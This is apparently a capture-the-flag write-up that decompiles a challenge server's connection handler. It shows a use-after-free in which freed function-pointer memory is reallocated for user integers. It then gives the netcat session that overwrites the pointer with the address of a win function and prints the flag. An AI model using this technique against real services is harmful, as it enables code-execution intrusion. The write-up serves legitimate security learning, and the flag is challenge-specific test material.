basics
======

Background
----------
The goal was to retrieve the flag stored on the server

Tools used
----------
* IDA Pro

Process
-------
Opening up the executable in IDA, I found that the function `handle` handled network connections, which I entered and got hexrays to decompile to:
````c
int __cdecl handle(int fd)
{
  char buf; // [sp+14h] [bp-414h]@2
  void *v3; // [sp+414h] [bp-14h]@1
  void *ptr; // [sp+418h] [bp-10h]@1
  int i; // [sp+41Ch] [bp-Ch]@1

  sendstr(fd, "Creating the function pointer struct...\n");
  ptr = malloc(0xCu);
  *((_DWORD *)ptr + 1) = do_nothing;
  sendstr(fd, "Doing something with the function pointer struct...\n");
  (*((void (**)(void))ptr + 1))();
  sendstr(fd, "Freeing the function pointer struct...\n");
  free(ptr);
  sendstr(fd, "Creating the integer struct...\n");
  v3 = malloc(0xCu);
  sendstr(fd, "Enter 3 integers, separated by newlines:\n");
  for ( i = 0; i <= 2; ++i )
  {
    sendstr(fd, "> ");
    readstr(fd, &buf, 1024);
    *((_DWORD *)v3 + i) = atoi(&buf);
  }
  sendstr(fd, "Those integers are: ");
  for ( i = 0; i <= 2; ++i )
  {
    sprintf(&buf, "%d, ", *((_DWORD *)v3 + i));
    sendstr(fd, &buf);
  }
  sendstr(fd, "\n");
  sendstr(fd, "Freeing the integer struct...\n");
  free(v3);
  sendstr(fd, "Doing something with the (now free'd) function pointer struct...\n");
  sock = fd;
  (*((void (**)(void))ptr + 1))();
  return 0;
}
````

I observed a few things about this code:
* It used an area of memory already freed as a pointer to a function to call
* It allocated 12 bytes of memory twice, the second time right after freeing the first, so it would likely be allocated to the same address
* It let us write three arbitrary 4-byte integers to that allocated memory

From this code, I now knew that sending a crafted second integer would allow us to call any arbitrary function as long as we knew it's address.

Looking through IDA again, I noticed the function `win` at address 0x08048953, which printed the flag over the socket, so I knew this must be the function to call.

0x08048953 in decimal is 134515027, so now all I had to do was enter it:
````
$ nc 54.252.230.167 2222
Creating the function pointer struct...
Doing something with the function pointer struct...
Freeing the function pointer struct...
Creating the integer struct...
Enter 3 integers, separated by newlines:
> 0
> 134515027
> 0
Those integers are: 0, 134515027, 0, 
Freeing the integer struct...
Doing something with the (now free'd) function pointer struct...
Congratulations! The key is: 1BVTerWTAuKX42HPX5HAih8wDQusT2aXMh
````
